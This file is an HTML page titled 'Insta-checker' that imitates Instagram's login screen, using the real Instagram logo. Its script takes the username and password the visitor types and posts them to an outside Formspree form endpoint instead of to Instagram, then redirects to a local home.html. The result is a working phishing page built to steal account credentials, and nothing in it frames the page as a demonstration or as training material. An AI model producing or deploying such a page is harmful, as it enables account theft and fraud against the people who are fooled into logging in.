<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Insta-checker</title>

  <style>
    /* Your existing styles */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Arial', sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 10px;
    }

    .container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      width: 100%;
    }

    .login-box {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      margin-bottom: 10px;
    }

    .logo {
      width: 175px;
      margin-bottom: 20px;
    }

    form input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }

    .login-btn {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 3px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-btn:hover {
      background-color: #007bb5;
    }

    .divider {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin: 15px 0;
    }

    .line {
      flex-grow: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .or {
      margin: 0 15px;
      color: #8e8e8e;
      font-weight: 500;
    }

    .fb-login-btn {
      width: 100%;
      padding: 10px;
      background-color: #385185;
      color: white;
      border: none;
      border-radius: 3px;
      font-weight: bold;
      cursor: pointer;
    }

    .fb-login-btn:hover {
      background-color: #2f417b;
    }

    .forgot-password {
      margin-top: 10px;
      color: #00376b;
      text-decoration: none;
      font-size: 12px;
    }

    .signup-box {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 20px;
      width: 350px;
      text-align: center;
    }

    .signup-box p {
      font-size: 14px;
      color: #8e8e8e;
    }

    .signup-box a {
      text-decoration: none;
      color: #0095f6;
      font-weight: bold;
    }

    /* Mobile Responsive Styles */
    @media (max-width: 500px) {
      .login-box, .signup-box {
        width: 100%;
        padding: 20px;
      }

      .logo {
        width: 150px;
      }

      form input {
        padding: 8px;
      }

      .login-btn, .fb-login-btn {
        padding: 8px;
      }

      .divider .or {
        font-size: 12px;
      }

      .forgot-password {
        font-size: 11px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
      <form id="login-form">
        <input type="text" id="username" name="uname" placeholder="Phone number, username, or email" required>
        <input type="password" name="pword" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
        <div class="divider">
          <div class="line"></div>
          <div class="or">OR</div>
          <div class="line"></div>
        </div>
        <button type="submit" class="fb-login-btn">Log in with Facebook</button>
        <a href="#" class="forgot-password">Forgot password?</a>
      </form>
    </div>
    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

  <script>
    document.getElementById('login-form').addEventListener('submit', function(event) {
      event.preventDefault();  // Prevent default form submission
      
      const username = document.getElementById('username').value;
      
      // Store the username in localStorage
      localStorage.setItem('username', username);

      // Send form data using Fetch API
      const formData = new FormData(this);
      fetch('https://formspree.io/f/xvgpnnpw', {
        method: 'POST',
        headers: {
          'Accept': 'application/json'
        },
        body: formData
      })
      .then(function(response) {
        if (response.ok) {
          // Redirect to home.html after successful submission
          window.location.href = 'home.html';
        } else {
          alert('Failed to log in. Please try again.');
        }
      })
      .catch(function(error) {
        console.error('Error:', error);
        alert('There was a problem with the submission.');
      });
    });
  </script>
</body>
</html>
